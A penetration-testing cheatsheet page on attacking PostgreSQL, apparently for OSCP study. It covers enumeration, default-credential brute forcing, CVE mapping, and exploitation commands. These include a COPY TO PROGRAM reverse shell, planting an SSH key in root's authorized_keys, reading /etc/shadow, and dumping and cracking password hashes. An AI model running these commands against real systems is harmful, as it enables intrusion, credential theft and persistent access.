# PostgreSQL

> Part of [Databases](./README.md) in the [Web Application Testing Cheatsheet](../../README.md).

**Contents:**

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Default and weak credentials](#3-default-and-weak-credentials)
- [4. Known CVEs](#4-known-cves)
- [5. Exploitation](#5-exploitation)
- [6. Post-exploitation](#6-post-exploitation)
- [7. OSCP notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### 1.1 Port and banner

Default port **5432**. Common deviations: 5433, 15432.

PostgreSQL does not send a banner until the client sends a **StartupMessage**. Raw `nc` will show nothing.

```bash
# Version detection
nmap -sV -p 5432 <TARGET>

# Brute force via NSE
nmap -p 5432 --script pgsql-brute <TARGET>

# Connect (if you have creds) - banner reveals version
psql -h <TARGET> -U postgres -c 'SELECT version();'
```

Expected output:

```text
5432/tcp open  postgresql PostgreSQL DB 9.6.0 or later
```

### 1.2 Version to CVE mapping

| Version range | Notable CVEs |
|---------------|--------------|
| 9.3 - 11.2 | CVE-2019-9193 (COPY TO PROGRAM RCE) |
| < 10.7 / 11.2 / 12 | CVE-2018-1058 (search_path hijack) |
| libpq <= 16.4 / 17.1 | CVE-2024-10977 (MITM via error message) |
| < 15.7 / 16.3 | CVE-2024-4317 (memory disclosure) |

---

## 2. Enumeration

### 2.1 Unauthenticated

- Version may be leaked in error messages from the web app (e.g. `pg_query()`: ...).
- `pg_hba.conf` misconfiguration: `trust` auth allows login without password.

### 2.2 Authenticated - basic

```sql
-- Version
SELECT version();

-- Current user and role
SELECT current_user, session_user;

-- List databases
\l

-- List roles and their privileges
\du

-- List tables in current DB
\dt

-- Read pg_hba.conf to see auth methods
SELECT * FROM pg_settings WHERE name = 'hba_file';
```

### 2.3 Check for superuser

```sql
SELECT rolsuper, rolcreaterole, rolcreatedb FROM pg_roles WHERE rolname = current_user;
```

If `rolsuper = t` -> you are superuser. `COPY ... TO PROGRAM` and `pg_read_file` are available.

### 2.4 Check `pg_read_server_files` role (PG 11+)

In PG 11+, `pg_read_file` requires either superuser or the `pg_read_server_files` role. Check:

```sql
SELECT pg_has_role(current_user, 'pg_read_server_files', 'member');
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).
> The superuser check determines whether RCE is immediately available.

---

## 3. Default and weak credentials

### 3.1 Common defaults

| User | Password | Notes |
|------|----------|-------|
| postgres | (empty) | Fresh install on some distros |
| postgres | postgres | Common in Docker, CTFs |
| postgres | password | Classic weak |
| postgres | admin | Custom setups |

### 3.2 Brute force

```bash
# Hydra
hydra -l postgres -P /usr/share/wordlists/rockyou.txt <TARGET> postgres

# nmap NSE
nmap -p 5432 --script pgsql-brute <TARGET>

# Metasploit
msfconsole -q -x "use auxiliary/scanner/postgres/postgres_login; set RHOSTS <TARGET>; set USERNAME postgres; set PASS_FILE /usr/share/wordlists/rockyou.txt; run"
```

---

## 4. Known CVEs

| CVE | Affected | Impact | NVD |
|-----|----------|--------|-----|
| CVE-2019-9193 | PG 9.3 - 11.2 | RCE via `COPY ... TO PROGRAM` (documented feature, not fixed - see note) | https://nvd.nist.gov/vuln/detail/CVE-2019-9193 |
| CVE-2018-1058 | PG < 10.7 / 11.2 | search_path hijack (privilege escalation) | https://nvd.nist.gov/vuln/detail/CVE-2018-1058 |
| CVE-2024-10977 | libpq <= 16.4 / 17.1 | MITM via error message injection | https://nvd.nist.gov/vuln/detail/CVE-2024-10977 |
| CVE-2024-4317 | PG < 15.7 / 16.3 | Memory disclosure via `pg_stats_ext` | https://nvd.nist.gov/vuln/detail/CVE-2024-4317 |

**Note on CVE-2019-9193:** the `COPY ... TO PROGRAM` feature is **documented** and requires **superuser**. It is not a bug per se - it is a design decision. NVD lists it as a vulnerability because superusers may not be aware of the RCE potential. In practice: if you have superuser access, you have RCE.

---

## 5. Exploitation

### 5.1 File read (superuser or pg_read_server_files role)

```sql
-- Read a text file
SELECT pg_read_file('/etc/passwd');

-- Read a file in chunks (if long)
SELECT pg_read_file('/etc/shadow', 0, 1000);

-- List a directory
SELECT pg_ls_dir('/var/lib/postgresql');
```

### 5.2 File write (superuser)

PostgreSQL 9.x: `COPY ... TO` was allowed for superusers. In PG 11+ it was restricted.

```sql
-- Write to a file (PG 9.x only)
COPY (SELECT 'content') TO '/tmp/out.txt';
```

### 5.3 RCE via COPY TO PROGRAM

Requires: superuser, PG 9.3+.

```sql
-- Reverse shell
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"';
```

Or simpler - write a SUID binary or add SSH key:

```sql
COPY (SELECT '') TO PROGRAM 'echo "ssh-ed25519 AAAA... attacker@box" >> /root/.ssh/authorized_keys';
COPY (SELECT '') TO PROGRAM 'chmod 600 /root/.ssh/authorized_keys';
```

### 5.4 UDF RCE (older PG, < 8.2)

Legacy: PostgreSQL < 8.2 allowed creating C functions from arbitrary .so files with `CREATE FUNCTION ... AS '/path/lib.so'`.

Modern PG (8.3+) restricts to `$libdir` unless the file is in the configured library directory.

### 5.5 search_path hijack (CVE-2018-1058)

If an application connects as a low-priv user but calls functions unqualified, you can shadow `public` schema functions. Combined with the app running as a more privileged user, this becomes privilege escalation.

```sql
CREATE SCHEMA evil;
CREATE FUNCTION evil.upper(text) RETURNS text AS $$
  SELECT 'hijacked';
$$ LANGUAGE sql;
SET search_path = evil, public;
```

---

## 6. Post-exploitation

### 6.1 Dump password hashes

```sql
SELECT usename, passwd FROM pg_shadow;
```

`pg_shadow` is superuser-only. Contains MD5 or SCRAM-SHA-256 hashes.

### 6.2 Crack hashes

Hashcat modes:
- `-m 12` - PostgreSQL MD5
- `-m 111` - PostgreSQL CRAM-MD5
- `-m 28600` - PostgreSQL SCRAM-SHA-256

```bash
hashcat -m 12 pg_hashes.txt /usr/share/wordlists/rockyou.txt
```

### 6.3 Read `/etc/shadow`

If `pg_read_file` works on `/etc/shadow`, dump and crack:

```sql
SELECT pg_read_file('/etc/shadow');
```

### 6.4 Reuse credentials

`pg_shadow` hashes often match `/etc/shadow` hashes if the DB and OS share the same user. Try SSH.

---

## 7. OSCP notes

> [!IMPORTANT]
> OSCP report: screenshot the `psql` connection that proves credential access (`SELECT version()` and `\du` output).

> [!IMPORTANT]
> OSCP report: screenshot the moment of RCE via `COPY ... TO PROGRAM` (reverse shell received or file written).

> [!IMPORTANT]
> OSCP report: screenshot any `pg_read_file` of `/etc/shadow` or a config file that yields credentials.

---

## 8. References

- PostgreSQL official docs - https://www.postgresql.org/docs/
- HackTricks - PostgreSQL - https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
- PayloadsAllTheThings - PostgreSQL - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
- CVE-2019-9193 - https://nvd.nist.gov/vuln/detail/CVE-2019-9193
- CVE-2018-1058 - https://nvd.nist.gov/vuln/detail/CVE-2018-1058
- CVE-2024-10977 - https://nvd.nist.gov/vuln/detail/CVE-2024-10977
- CVE-2024-4317 - https://nvd.nist.gov/vuln/detail/CVE-2024-4317

---
